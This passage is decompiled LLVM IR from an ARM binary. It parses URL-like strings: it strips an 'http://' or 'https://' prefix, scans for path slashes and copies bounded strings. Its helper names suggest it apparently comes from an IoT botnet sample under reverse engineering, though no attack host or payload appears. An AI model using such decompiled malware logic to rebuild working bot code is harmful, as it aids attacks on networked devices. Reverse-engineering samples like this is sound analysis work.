  %v1_a104 = trunc i32 %v0_a104 to i8
  %v2_a104 = load i32, i32* @sl, align 4
  %v3_a104 = add i32 %v2_a104, -1448
  %v4_a104 = inttoptr i32 %v3_a104 to i8*
  store i8 %v1_a104, i8* %v4_a104, align 1
  br label %dec_label_pc_8ef8

dec_label_pc_a10c:                                ; preds = %bb201
  store i32 7, i32* @ip, align 4
  store i32 %v10_89fc, i32* %r1.global-to-local, align 4
  store i32 7, i32* %stack_var_-44, align 4
  %v0_a118 = load i32, i32* @r6, align 4
  %v1_a118 = add i32 %v0_a118, 4
  %v2_a118 = inttoptr i32 %v1_a118 to i8*
  %v3_a118 = load i8, i8* %v2_a118, align 1
  %v4_a118 = zext i8 %v3_a118 to i32
  store i32 %v4_a118, i32* @r3, align 4
  %v2_a11c = icmp ugt i8 %v3_a118, 114
  store i1 %v2_a11c, i1* %cpsr_c.global-to-local, align 1
  %v7_a11c = icmp eq i8 %v3_a118, 115
  store i1 %v7_a11c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a11c, label %bb206, label %.thread41

bb206:                                            ; preds = %dec_label_pc_a10c
  store i32 8, i32* @ip, align 4
  store i32 8, i32* %stack_var_-44, align 4
  br label %.thread41

.thread41:                                        ; preds = %dec_label_pc_a10c, %bb206
  %v3_a12c = phi i32 [ 7, %dec_label_pc_a10c ], [ 8, %bb206 ]
  store i32 %v0_a118, i32* @r0, align 4
  %v1_a134 = load i32, i32* @r5, align 4
  %v2_a134 = sub i32 %v1_a134, %v3_a12c
  store i32 %v2_a134, i32* @r2, align 4
  %v2_a138 = add i32 %v3_a12c, %v0_a118
  store i32 %v2_a138, i32* @r1, align 4
  %v3_a13c = call i32 @memmove(i32 %v0_a118, i32 %v2_a138, i32 %v2_a134)
  store i32 %v3_a13c, i32* %r0.global-to-local, align 4
  store i32 %v10_89fc, i32* %r3.global-to-local, align 4
  %v0_a144 = load i32, i32* @r7, align 4
  store i32 %v0_a144, i32* %stack_var_-44, align 4
  store i32 %v2_8988, i32* @lr, align 4
  %v1_a14c = load i32, i32* @r4, align 4
  %v2_a14c = add i32 %v1_a14c, %v2_8988
  %v3_a14c = inttoptr i32 %v2_a14c to i8*
  %v4_a14c = load i8, i8* %v3_a14c, align 1
  %v6_a14c = zext i8 %v4_a14c to i32
  store i32 %v6_a14c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_a150 = icmp eq i8 %v4_a14c, 0
  store i1 %v2_a150, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a150, label %dec_label_pc_a194, label %dec_label_pc_a158

dec_label_pc_a158:                                ; preds = %.thread41
  %v2_a158 = icmp ugt i8 %v4_a14c, 46
  store i1 %v2_a158, i1* %cpsr_c.global-to-local, align 1
  %v7_a158 = icmp eq i8 %v4_a14c, 47
  store i1 %v7_a158, i1* %cpsr_z.global-to-local, align 1
  %v1_a15c = load i32, i32* @r6, align 4
  br i1 %v7_a158, label %bb207, label %dec_label_pc_a164

bb207:                                            ; preds = %dec_label_pc_a158
  store i32 %v1_a15c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_a254

dec_label_pc_a164:                                ; preds = %dec_label_pc_a158
  store i32 %v0_a144, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_a174

dec_label_pc_a16c:                                ; preds = %dec_label_pc_a174
  %v2_a16c = icmp ugt i8 %v4_a180, 46
  store i1 %v2_a16c, i1* %cpsr_c.global-to-local, align 1
  %v7_a16c = icmp eq i8 %v4_a180, 47
  store i1 %v7_a16c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a16c, label %dec_label_pc_a254, label %dec_label_pc_a174

dec_label_pc_a174:                                ; preds = %dec_label_pc_a16c, %dec_label_pc_a164
  %v0_a174 = phi i32 [ %v1_a174, %dec_label_pc_a16c ], [ %v0_a144, %dec_label_pc_a164 ]
  %v1_a174 = add i32 %v0_a174, 1
  store i32 %v1_a174, i32* %ip.global-to-local, align 4
  store i32 %v10_89fc, i32* %r2.global-to-local, align 4
  store i32 %v1_a174, i32* %stack_var_-44, align 4
  %v2_a180 = add i32 %v1_a174, %v1_a15c
  %v3_a180 = inttoptr i32 %v2_a180 to i8*
  %v4_a180 = load i8, i8* %v3_a180, align 1
  %v6_a180 = zext i8 %v4_a180 to i32
  store i32 %v6_a180, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_a184 = icmp eq i8 %v4_a180, 0
  store i1 %v2_a184, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a174, i32* %r1.global-to-local, align 4
  store i32 %v2_a180, i32* %r2.global-to-local, align 4
  br i1 %v2_a184, label %dec_label_pc_a194, label %dec_label_pc_a16c

dec_label_pc_a194:                                ; preds = %dec_label_pc_a174, %.thread41, %dec_label_pc_a254
  %v0_a194 = load i32, i32* @r6, align 4
  store i32 %v0_a194, i32* %r0.global-to-local, align 4
  %v1_a198 = inttoptr i32 %v0_a194 to i8*
  %v2_a198 = call i32 @util_strlen(i8* %v1_a198)
  store i32 %v2_a198, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_a19c = icmp eq i32 %v2_a198, 0
  store i1 %v2_a19c, i1* %cpsr_z.global-to-local, align 1
  %tmp208 = icmp slt i32 %v2_a198, 1
  br i1 %tmp208, label %dec_label_pc_a1c0, label %dec_label_pc_a1a4

dec_label_pc_a1a4:                                ; preds = %dec_label_pc_a194
  %v0_a1a4 = load i32, i32* @r6, align 4
  store i32 %v0_a1a4, i32* %r0.global-to-local, align 4
  %v1_a1a8 = inttoptr i32 %v0_a1a4 to i8*
  %v2_a1a8 = call i32 @util_strlen(i8* %v1_a1a8)
  store i32 %v2_a1a8, i32* %r0.global-to-local, align 4
  %v1_a1ac = add i32 %v2_a1a8, -127
  %v2_a1ac = icmp ugt i32 %v2_a1a8, 126
  store i1 %v2_a1ac, i1* %cpsr_c.global-to-local, align 1
  %v3_a1ac = sub i32 126, %v2_a1a8
  %v4_a1ac = and i32 %v3_a1ac, %v2_a1a8
  %v5_a1ac = icmp slt i32 %v4_a1ac, 0
  %v6_a1ac = icmp slt i32 %v1_a1ac, 0
  %v7_a1ac = icmp eq i32 %v2_a1a8, 127
  store i1 %v7_a1ac, i1* %cpsr_z.global-to-local, align 1
  %v7_a1b0 = icmp sgt i32 %v2_a1a8, 127
  br i1 %v7_a1b0, label %.thread44, label %bb209

bb209:                                            ; preds = %dec_label_pc_a1a4
  %v8_a1b0 = load i32, i32* %sb.global-to-local, align 4
  %v9_a1b4 = add i32 %v8_a1b0, 789
  store i32 %v9_a1b4, i32* %r0.global-to-local, align 4
  %v8_a1b8 = load i32, i32* @r6, align 4
  store i32 %v8_a1b8, i32* %r1.global-to-local, align 4
  br label %.thread44

.thread44:                                        ; preds = %dec_label_pc_a1a4, %bb209
  store i32 41408, i32* @lr, align 4
  %v3_a1bc = xor i1 %v6_a1ac, %v5_a1ac
  %v4_a1bc = or i1 %v7_a1ac, %v3_a1bc
  call void @__pseudo_cond_branch(i1 %v4_a1bc, i32 ptrtoint (i32* @global_var_12508.86 to i32))
  br label %dec_label_pc_a1c0

dec_label_pc_a1c0:                                ; preds = %dec_label_pc_a194, %.thread44
  store i32 %v10_89fc, i32* %r3.global-to-local, align 4
  %v3_a1c4 = load i32, i32* %stack_var_-44, align 4
  %v0_a1c8 = load i32, i32* @r6, align 4
  %v1_a1c8 = add i32 %v0_a1c8, 1
  store i32 %v1_a1c8, i32* @r5, align 4
  %v2_a1cc = add i32 %v1_a1c8, %v3_a1c4
  store i32 %v2_a1cc, i32* %r0.global-to-local, align 4
  %v1_a1d0 = inttoptr i32 %v2_a1cc to i8*
  %v2_a1d0 = call i32 @util_strlen(i8* %v1_a1d0)
  store i32 %v2_a1d0, i32* %r0.global-to-local, align 4
  %v2_a1d4 = icmp ugt i32 %v2_a1d0, 254
  store i1 %v2_a1d4, i1* %cpsr_c.global-to-local, align 1
  %v7_a1d4 = icmp eq i32 %v2_a1d0, 255
  store i1 %v7_a1d4, i1* %cpsr_z.global-to-local, align 1
  %v8_a1d8 = icmp sgt i32 %v2_a1d0, 255
  br i1 %v8_a1d8, label %dec_label_pc_9d60, label %dec_label_pc_a1dc

dec_label_pc_a1dc:                                ; preds = %dec_label_pc_a1c0
  %v0_a1dc = load i32, i32* %sb.global-to-local, align 4
  %v1_a1e0 = add i32 %v0_a1dc, 533
  store i32 %v1_a1e0, i32* @r4, align 4
  store i32 %v1_a1e0, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_a1ec = call i32 @util_zero(i32 %v1_a1e0, i32 255)
  store i32 %v10_89fc, i32* %ip.global-to-local, align 4
  %v3_a1f4 = load i32, i32* %stack_var_-44, align 4
  %v0_a1f8 = load i32, i32* @r5, align 4
  %v2_a1f8 = add i32 %v0_a1f8, %v3_a1f4
  store i32 %v2_a1f8, i32* %r0.global-to-local, align 4
  %v1_a1fc = inttoptr i32 %v2_a1f8 to i8*
  %v2_a1fc = call i32 @util_strlen(i8* %v1_a1fc)
  store i32 %v2_a1fc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_a200 = icmp eq i32 %v2_a1fc, 0
  store i1 %v2_a200, i1* %cpsr_z.global-to-local, align 1
  %tmp210 = icmp slt i32 %v2_a1fc, 1
  br i1 %tmp210, label %dec_label_pc_9d60, label %dec_label_pc_a208

dec_label_pc_a208:                                ; preds = %dec_label_pc_a1dc
  %v3_a20c = load i32, i32* %stack_var_-44, align 4
  %v0_a210 = load i32, i32* @r4, align 4
  store i32 %v0_a210, i32* @r0, align 4
  %v0_a214 = load i32, i32* @r5, align 4
  %v2_a214 = add i32 %v0_a214, %v3_a20c
  store i32 %v2_a214, i32* %r1.global-to-local, align 4
  %v2_a218 = inttoptr i32 %v0_a210 to i8*
  %v3_a218 = call i32 @util_strcpy(i8* %v2_a218, i32 %v2_a214)
  store i32 %v3_a218, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9d60

dec_label_pc_a220:                                ; preds = %dec_label_pc_a044
  %v0_a220 = load i32, i32* @r4, align 4
  store i32 %v0_a220, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1b3b8.56 to i32), i32* %r1.global-to-local, align 4
  %v3_a228 = inttoptr i32 %v0_a220 to i8*
  %v4_a228 = call i32 @util_strcmp(i8* %v3_a228, i32 ptrtoint ([4 x i8]* @global_var_1b3b8.56 to i32))
  store i32 %v4_a228, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_a22c = icmp eq i32 %v4_a228, 0
  store i1 %v2_a22c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a22c, label %bb211, label %dec_label_pc_a078

bb211:                                            ; preds = %dec_label_pc_a220
  %v0_a234 = load i32, i32* %fp.global-to-local, align 4
  %v1_a234 = load i32, i32* @r5, align 4
  %v3_a234 = icmp uge i32 %v0_a234, %v1_a234
  store i1 %v3_a234, i1* %cpsr_c.global-to-local, align 1
  %v9_a234 = icmp eq i32 %v0_a234, %v1_a234
  store i1 %v9_a234, i1* %cpsr_z.global-to-local, align 1
  %v7_a238 = icmp sgt i32 %v0_a234, %v1_a234
  %. = select i1 %v7_a238, i32 10, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v9_a240 = trunc i32 %. to i8
  %v10_a240 = load i32, i32* @sl, align 4
  %v11_a240 = add i32 %v10_a240, -1448
  %v12_a240 = inttoptr i32 %v11_a240 to i8*
  store i8 %v9_a240, i8* %v12_a240, align 1
  br label %dec_label_pc_a080

dec_label_pc_a24c:                                ; preds = %dec_label_pc_9644
  %v0_a24c = load i32, i32* @r4, align 4
  %v1_a24c = trunc i32 %v0_a24c to i8
  %v2_a24c = load i32, i32* @sl, align 4
  %v3_a24c = add i32 %v2_a24c, -1448
  %v4_a24c = inttoptr i32 %v3_a24c to i8*
  store i8 %v1_a24c, i8* %v4_a24c, align 1
  br label %dec_label_pc_8ef8

dec_label_pc_a254:                                ; preds = %dec_label_pc_a16c, %bb207
  %v2_a258 = phi i32 [ %v1_a15c, %bb207 ], [ %v2_a180, %dec_label_pc_a16c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_a258 = inttoptr i32 %v2_a258 to i8*
  store i8 0, i8* %v3_a258, align 1
  br label %dec_label_pc_a194

dec_label_pc_a260:                                ; preds = %dec_label_pc_a098
  %v0_a260 = load i32, i32* @r6, align 4
  store i32 %v0_a260, i32* %r0.global-to-local, align 4
  %v1_a264 = inttoptr i32 %v0_a260 to i8*
  %v2_a264 = call i32 @util_strlen(i8* %v1_a264)
  store i32 %v2_a264, i32* %r0.global-to-local, align 4
  %v2_a268 = icmp ugt i32 %v2_a264, 126
  store i1 %v2_a268, i1* %cpsr_c.global-to-local, align 1
  %v7_a268 = icmp eq i32 %v2_a264, 127
  store i1 %v7_a268, i1* %cpsr_z.global-to-local, align 1
  %v8_a26c = icmp sgt i32 %v2_a264, 127
  br i1 %v8_a26c, label %dec_label_pc_a0f8, label %dec_label_pc_a270

dec_label_pc_a270:                                ; preds = %dec_label_pc_a260
  %v0_a270 = load i32, i32* @sl, align 4
  %v1_a270 = add i32 %v0_a270, 16
  %v2_a270 = inttoptr i32 %v1_a270 to i32*
  %v3_a270 = load i32, i32* %v2_a270, align 4
  %v1_a274 = and i32 %v3_a270, 33554432
  %v2_a274 = icmp ne i32 %v1_a274, 0
  store i1 %v2_a274, i1* %cpsr_c.global-to-local, align 1
  %v3_a274 = mul i32 %v3_a270, 128
  %v1_a278 = add i32 %v3_a274, 1472
  %v0_a27c = load i32, i32* @r6, align 4
  store i32 %v0_a27c, i32* %r1.global-to-local, align 4
  %v0_a280 = load i32, i32* %sb.global-to-local, align 4
  %v2_a280 = add i32 %v1_a278, %v0_a280
  store i32 %v2_a280, i32* @r0, align 4
  %v2_a284 = inttoptr i32 %v2_a280 to i8*
  %v3_a284 = call i32 @util_strcpy(i8* %v2_a284, i32 %v0_a27c)
  store i32 %v3_a284, i32* %r0.global-to-local, align 4
  %v0_a288 = load i32, i32* @sl, align 4
  %v1_a288 = add i32 %v0_a288, 16
  %v2_a288 = inttoptr i32 %v1_a288 to i32*
  %v3_a288 = load i32, i32* %v2_a288, align 4
  %v1_a28c = and i32 %v3_a288, 33554432
  %v2_a28c = icmp ne i32 %v1_a28c, 0
  store i1 %v2_a28c, i1* %cpsr_c.global-to-local, align 1
  %v3_a28c = mul i32 %v3_a288, 128
  %v1_a290 = add i32 %v3_a28c, 1472
  %v0_a294 = load i32, i32* %sb.global-to-local, align 4
  %v2_a294 = add i32 %v1_a290, %v0_a294
  store i32 %v2_a294, i32* @r4, align 4
  store i32 %v2_a294, i32* %r0.global-to-local, align 4
  %v1_a29c = inttoptr i32 %v2_a294 to i8*
  %v2_a29c = call i32 @util_strlen(i8* %v1_a29c)
  store i32 ptrtoint (i32* @global_var_1bbb0.88 to i32), i32* %r1.global-to-local, align 4
  %v0_a2a4 = load i32, i32* @r4, align 4
  %v2_a2a4 = add i32 %v0_a2a4, %v2_a29c
  store i32 %v2_a2a4, i32* @r0, align 4
  %v2_a2a8 = inttoptr i32 %v2_a2a4 to i8*
  %v3_a2a8 = call i32 @util_strcpy(i8* %v2_a2a8, i32 ptrtoint (i32* @global_var_1bbb0.88 to i32))
  store i32 %v3_a2a8, i32* %r0.global-to-local, align 4
  %v0_a2ac = load i32, i32* @r5, align 4
  %v1_a2ac = add i32 %v0_a2ac, 3
  store i32 %v1_a2ac, i32* @r5, align 4
  %v0_a2b0 = load i32, i32* @sl, align 4
  %v1_a2b0 = add i32 %v0_a2b0, 660
  %v2_a2b0 = inttoptr i32 %v1_a2b0 to i32*
  %v3_a2b0 = load i32, i32* %v2_a2b0, align 4
  %v0_a2b4 = load i32, i32* @r7, align 4
  %v2_a2b4 = add i32 %v0_a2b4, %v1_a2ac
  store i32 %v2_a2b4, i32* @r6, align 4
  %v2_a2b8 = sub i32 %v3_a2b0, %v1_a2ac
  store i32 %v2_a2b8, i32* %r1.global-to-local, align 4
  %v0_a2bc = load i32, i32* @r8, align 4
  store i32 %v0_a2bc, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b3f4.85 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a2b4, i32* %r0.global-to-local, align 4
  %v4_a2c8 = call i32 @util_memsearch(i32 %v2_a2b4, i32 %v2_a2b8, i32 ptrtoint (i32* @global_var_1b3f4.85 to i32), i32 %v0_a2bc)
  store i32 %v4_a2c8, i32* %r0.global-to-local, align 4
  %v0_a2cc = load i32, i32* @sl, align 4
  %v1_a2cc = add i32 %v0_a2cc, 16
  %v2_a2cc = inttoptr i32 %v1_a2cc to i32*
  %v3_a2cc = load i32, i32* %v2_a2cc, align 4
  %v1_a2d0 = and i32 %v3_a2cc, 33554432
  %v2_a2d0 = icmp ne i32 %v1_a2d0, 0
  store i1 %v2_a2d0, i1* %cpsr_c.global-to-local, align 1
  %v3_a2d0 = mul i32 %v3_a2cc, 128
  %v1_a2d4 = add i32 %v3_a2d0, 1472
  %v0_a2d8 = load i32, i32* %sb.global-to-local, align 4
  %v1_a2d8 = load i32, i32* @r5, align 4
  %v2_a2dc = add i32 %v1_a2d4, %v0_a2d8
  store i32 %v2_a2dc, i32* @r4, align 4
  %v2_a2d8 = add i32 %v0_a2d8, %v4_a2c8
  %v2_a2e0 = add i32 %v2_a2d8, %v1_a2d8
  store i32 %v2_a2e0, i32* @r5, align 4
  %v0_a2e4 = load i32, i32* %fp.global-to-local, align 4
  %v1_a2e4 = trunc i32 %v0_a2e4 to i8
  %v3_a2e4 = add i32 %v2_a2e0, 2115
  %v4_a2e4 = inttoptr i32 %v3_a2e4 to i8*
  store i8 %v1_a2e4, i8* %v4_a2e4, align 1
  %v0_a2e8 = load i32, i32* @r4, align 4
  store i32 %v0_a2e8, i32* %r0.global-to-local, align 4
  %v1_a2ec = inttoptr i32 %v0_a2e8 to i8*
  %v2_a2ec = call i32 @util_strlen(i8* %v1_a2ec)
  %v0_a2f0 = load i32, i32* @r6, align 4
  store i32 %v0_a2f0, i32* %r1.global-to-local, align 4
  %v0_a2f4 = load i32, i32* @r4, align 4
  %v2_a2f4 = add i32 %v0_a2f4, %v2_a2ec
  store i32 %v2_a2f4, i32* @r0, align 4
  %v2_a2f8 = inttoptr i32 %v2_a2f4 to i8*
  %v3_a2f8 = call i32 @util_strcpy(i8* %v2_a2f8, i32 %v0_a2f0)
  store i32 %v3_a2f8, i32* %r0.global-to-local, align 4
  %v0_a2fc = load i32, i32* @sl, align 4
  %v1_a2fc = add i32 %v0_a2fc, 16
  %v2_a2fc = inttoptr i32 %v1_a2fc to i32*
  %v3_a2fc = load i32, i32* %v2_a2fc, align 4
  %v1_a300 = add i32 %v3_a2fc, 1
  store i32 %v1_a300, i32* %r3.global-to-local, align 4
  store i32 %v1_a300, i32* %v2_a2fc, align 4
  br label %dec_label_pc_a0f8

dec_label_pc_a30c:                                ; preds = %dec_label_pc_9d50
  %v0_a30c = load i32, i32* %sb.global-to-local, align 4
  %v1_a310 = add i32 %v0_a30c, 533
  store i32 %v1_a310, i32* @r4, align 4
  store i32 %v1_a310, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_a31c = call i32 @util_zero(i32 %v1_a310, i32 255)
  store i32 %v10_89fc, i32* %r2.global-to-local, align 4
  %v3_a324 = load i32, i32* %stack_var_-44, align 4
  %v0_a328 = load i32, i32* @r6, align 4
  %v1_a328 = add i32 %v0_a328, 1
  store i32 %v1_a328, i32* @r6, align 4
  %v2_a32c = add i32 %v1_a328, %v3_a324
  store i32 %v2_a32c, i32* %r0.global-to-local, align 4
  %v1_a330 = inttoptr i32 %v2_a32c to i8*
  %v2_a330 = call i32 @util_strlen(i8* %v1_a330)
  store i32 %v2_a330, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_a334 = icmp eq i32 %v2_a330, 0
  store i1 %v2_a334, i1* %cpsr_z.global-to-local, align 1
  %tmp212 = icmp slt i32 %v2_a330, 1
  br i1 %tmp212, label %dec_label_pc_9d60, label %dec_label_pc_a33c

dec_label_pc_a33c:                                ; preds = %dec_label_pc_a30c
  store i32 %v10_89fc, i32* %r3.global-to-local, align 4
  %v3_a340 = load i32, i32* %stack_var_-44, align 4
  %v0_a344 = load i32, i32* @r6, align 4
  %v2_a344 = add i32 %v0_a344, %v3_a340
  store i32 %v2_a344, i32* %r0.global-to-local, align 4
  %v1_a348 = inttoptr i32 %v2_a344 to i8*
  %v2_a348 = call i32 @util_strlen(i8* %v1_a348)
  store i32 %v2_a348, i32* %r0.global-to-local, align 4
  %v2_a34c = icmp ugt i32 %v2_a348, 254
  store i1 %v2_a34c, i1* %cpsr_c.global-to-local, align 1
  %v7_a34c = icmp eq i32 %v2_a348, 255
  store i1 %v7_a34c, i1* %cpsr_z.global-to-local, align 1
  %v8_a350 = icmp sgt i32 %v2_a348, 255
  br i1 %v8_a350, label %dec_label_pc_9d60, label %dec_label_pc_a354

dec_label_pc_a354:                                ; preds = %dec_label_pc_a33c
  store i32 %v10_89fc, i32* %ip.global-to-local, align 4
  %v3_a358 = load i32, i32* %stack_var_-44, align 4
  %v0_a35c = load i32, i32* @r4, align 4
  store i32 %v0_a35c, i32* @r0, align 4
  %v0_a360 = load i32, i32* @r6, align 4
  %v2_a360 = add i32 %v0_a360, %v3_a358
  store i32 %v2_a360, i32* %r1.global-to-local, align 4
  %v2_a364 = inttoptr i32 %v0_a35c to i8*
  %v3_a364 = call i32 @util_strcpy(i8* %v2_a364, i32 %v2_a360)
  store i32 %v3_a364, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9d60

dec_label_pc_a36c:                                ; preds = %dec_label_pc_9fec
  store i32 7, i32* @ip, align 4
  store i32 %v10_89fc, i32* @lr, align 4
  store i32 7, i32* %stack_var_-44, align 4
  %v0_a378 = load i32, i32* @r6, align 4
  %v1_a378 = add i32 %v0_a378, 4
  %v2_a378 = inttoptr i32 %v1_a378 to i8*
  %v3_a378 = load i8, i8* %v2_a378, align 1
  %v4_a378 = zext i8 %v3_a378 to i32
  store i32 %v4_a378, i32* @r3, align 4
  %v2_a37c = icmp ugt i8 %v3_a378, 114
  store i1 %v2_a37c, i1* %cpsr_c.global-to-local, align 1
  %v7_a37c = icmp eq i8 %v3_a378, 115
  store i1 %v7_a37c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a37c, label %bb213, label %.thread47

bb213:                                            ; preds = %dec_label_pc_a36c
  store i32 8, i32* @ip, align 4
  store i32 8, i32* %stack_var_-44, align 4
  br label %.thread47

.thread47:                                        ; preds = %dec_label_pc_a36c, %bb213
  %v3_a38c = phi i32 [ 7, %dec_label_pc_a36c ], [ 8, %bb213 ]
  %v1_a390 = sub nsw i32 1, %v3_a38c
  %v1_a394 = load i32, i32* @r7, align 4
  %v2_a394 = add i32 %v1_a394, %v1_a390
  store i32 %v2_a394, i32* @r2, align 4
  %v2_a398 = add i32 %v3_a38c, %v0_a378
  store i32 %v2_a398, i32* @r1, align 4
  store i32 %v0_a378, i32* @r0, align 4
  %v3_a3a0 = call i32 @memmove(i32 %v0_a378, i32 %v2_a398, i32 %v2_a394)
  store i32 %v3_a3a0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  store i32 %v10_89fc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v0_a3b0 = load i32, i32* @r5, align 4
  %v1_a3b0 = load i32, i32* @r4, align 4
  %v2_a3b0 = add i32 %v1_a3b0, %v0_a3b0
  %v3_a3b0 = inttoptr i32 %v2_a3b0 to i8*
  %v4_a3b0 = load i8, i8* %v3_a3b0, align 1
  %v6_a3b0 = zext i8 %v4_a3b0 to i32
  store i32 %v6_a3b0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_a3b4 = icmp eq i8 %v4_a3b0, 0
  store i1 %v9_a3b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a3b4, label %dec_label_pc_a3f4, label %dec_label_pc_a3bc

dec_label_pc_a3bc:                                ; preds = %.thread47
  %v2_a3bc = icmp ugt i8 %v4_a3b0, 46
  store i1 %v2_a3bc, i1* %cpsr_c.global-to-local, align 1
  %v7_a3bc = icmp eq i8 %v4_a3b0, 47
  store i1 %v7_a3bc, i1* %cpsr_z.global-to-local, align 1
  %v1_a3c0 = load i32, i32* @r6, align 4
  br i1 %v7_a3bc, label %bb214, label %dec_label_pc_a3c8

bb214:                                            ; preds = %dec_label_pc_a3bc
  store i32 %v1_a3c0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_a474

dec_label_pc_a3c8:                                ; preds = %dec_label_pc_a3bc
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_a3d8

dec_label_pc_a3d0:                                ; preds = %dec_label_pc_a3d8
  %v2_a3d0 = icmp ugt i8 %v4_a3e4, 46
  store i1 %v2_a3d0, i1* %cpsr_c.global-to-local, align 1
  %v7_a3d0 = icmp eq i8 %v4_a3e4, 47
  store i1 %v7_a3d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a3d0, label %dec_label_pc_a474, label %dec_label_pc_a3d8

dec_label_pc_a3d8:                                ; preds = %dec_label_pc_a3d0, %dec_label_pc_a3c8
  %v0_a3d8 = phi i32 [ %v1_a3d8, %dec_label_pc_a3d0 ], [ 0, %dec_label_pc_a3c8 ]
  %v1_a3d8 = add i32 %v0_a3d8, 1
  store i32 %v1_a3d8, i32* %r1.global-to-local, align 4
  store i32 %v10_89fc, i32* @ip, align 4
  store i32 %v1_a3d8, i32* %stack_var_-44, align 4
  %v2_a3e4 = add i32 %v1_a3d8, %v1_a3c0
  %v3_a3e4 = inttoptr i32 %v2_a3e4 to i8*
  %v4_a3e4 = load i8, i8* %v3_a3e4, align 1
  %v6_a3e4 = zext i8 %v4_a3e4 to i32
  store i32 %v6_a3e4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_a3e8 = icmp eq i8 %v4_a3e4, 0
  store i1 %v2_a3e8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_a3e4, i32* %r2.global-to-local, align 4
  br i1 %v2_a3e8, label %dec_label_pc_a3f4, label %dec_label_pc_a3d0

dec_label_pc_a3f4:                                ; preds = %dec_label_pc_a3d8, %.thread47, %dec_label_pc_a474
  %v0_a3f4 = load i32, i32* @r6, align 4
  store i32 %v0_a3f4, i32* %r0.global-to-local, align 4
  %v1_a3f8 = inttoptr i32 %v0_a3f4 to i8*
  %v2_a3f8 = call i32 @util_strlen(i8* %v1_a3f8)
  store i32 %v2_a3f8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_a3fc = icmp eq i32 %v2_a3f8, 0
  store i1 %v2_a3fc, i1* %cpsr_z.global-to-local, align 1
  %tmp215 = icmp slt i32 %v2_a3f8, 1
  br i1 %tmp215, label %dec_label_pc_a414, label %dec_label_pc_a404

dec_label_pc_a404:                                ; preds = %dec_label_pc_a3f4
  %v0_a404 = load i32, i32* @r6, align 4
  store i32 %v0_a404, i32* %r0.global-to-local, align 4
  %v1_a408 = inttoptr i32 %v0_a404 to i8*
  %v2_a408 = call i32 @util_strlen(i8* %v1_a408)
  store i32 %v2_a408, i32* %r0.global-to-local, align 4
  %v2_a40c = icmp ugt i32 %v2_a408, 126
  store i1 %v2_a40c, i1* %cpsr_c.global-to-local, align 1
  %v7_a40c = icmp eq i32 %v2_a408, 127
  store i1 %v7_a40c, i1* %cpsr_z.global-to-local, align 1
  %v7_a410 = icmp slt i32 %v2_a408, 128
  br i1 %v7_a410, label %dec_label_pc_a5d4, label %dec_label_pc_a414

dec_label_pc_a414:                                ; preds = %dec_label_pc_a404, %dec_label_pc_a3f4, %dec_label_pc_a5d4
  store i32 %v10_89fc, i32* @lr, align 4
  %v3_a418 = load i32, i32* %stack_var_-44, align 4
  %v0_a41c = load i32, i32* @r6, align 4
  %v1_a41c = add i32 %v0_a41c, 1
  store i32 %v1_a41c, i32* @r5, align 4
  %v2_a420 = add i32 %v1_a41c, %v3_a418
  store i32 %v2_a420, i32* %r0.global-to-local, align 4
  %v1_a424 = inttoptr i32 %v2_a420 to i8*
  %v2_a424 = call i32 @util_strlen(i8* %v1_a424)
  store i32 %v2_a424, i32* %r0.global-to-local, align 4
  %v2_a428 = icmp ugt i32 %v2_a424, 254
  store i1 %v2_a428, i1* %cpsr_c.global-to-local, align 1
  %v7_a428 = icmp eq i32 %v2_a424, 255
  store i1 %v7_a428, i1* %cpsr_z.global-to-local, align 1
  %v8_a42c = icmp sgt i32 %v2_a424, 255
  br i1 %v8_a42c, label %dec_label_pc_a024, label %dec_label_pc_a430

dec_label_pc_a430:                                ; preds = %dec_label_pc_a414
  %v0_a430 = load i32, i32* %sb.global-to-local, align 4
  %v1_a434 = add i32 %v0_a430, 533
  store i32 %v1_a434, i32* @r4, align 4
  store i32 %v1_a434, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_a440 = call i32 @util_zero(i32 %v1_a434, i32 255)
  store i32 %v10_89fc, i32* %r1.global-to-local, align 4
  %v3_a448 = load i32, i32* %stack_var_-44, align 4
  %v0_a44c = load i32, i32* @r5, align 4
  %v2_a44c = add i32 %v0_a44c, %v3_a448
  store i32 %v2_a44c, i32* %r0.global-to-local, align 4
